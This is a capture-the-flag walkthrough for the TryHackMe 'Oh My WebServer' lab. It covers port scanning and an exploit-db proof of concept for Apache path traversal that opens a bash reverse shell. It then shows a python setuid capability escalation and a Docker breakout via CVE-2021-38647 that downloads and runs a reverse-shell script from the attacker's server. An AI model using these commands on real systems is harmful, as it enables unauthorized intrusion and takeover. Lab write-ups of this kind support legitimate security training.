# Oh My WebServer

**Room Link:** [https://tryhackme.com/room/ohmyweb](https://tryhackme.com/room/ohmyweb)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

**Exploit:** [https://www.exploit-db.com/raw/50383](https://www.exploit-db.com/raw/50383)

**Kali**

```
nc -lvnp 1337
```

**Kali**

```
wget https://www.exploit-db.com/raw/50383 -O poc.sh
chmod +x poc.sh
./poc.sh targets.txt /bin/bash "bash -c 'bash -i >& /dev/tcp/$KALI/1337 0>&1'"
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>





## Privileges Escalation

**Exploit:** [https://gtfobins.github.io/gtfobins/python/](https://gtfobins.github.io/gtfobins/python/)

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
getcap -r / 2>/dev/null
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>



#### Nmap

Scanned the gateway&#x20;

**Kali**

```
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
curl http://10.10.30.128:81/nmap -O nmap
chmod +x nmap
./nmap -p- 172.17.0.1 --min-rate=700 -vvv
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



## Privileges Escalation / Breakout of Docker



**shell.sh**

```
#!/bin/bash

sh -i >& /dev/tcp/$KALI/1338 0>&1
```

**Kali**

```
git clone https://github.com/horizon3ai/CVE-2021-38647.git
cd CVE-2021-38647/
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
curl http://10.10.30.128:81/omigod.py -O omigod.py
```

**Kali**

```
nc -lvnp 1338
```

**Victim**

```
python3 omigod.py -t 172.17.0.1 -c "curl http://$KALI:81/shell.sh -O shell.sh"
python3 omigod.py -t 172.17.0.1 -c "chmod +x shell.sh"
python3 omigod.py -t 172.17.0.1 -c "./shell.sh"
```

<figure><img src="../../.gitbook/assets/image (622).png" alt=""><figcaption></figcaption></figure>





























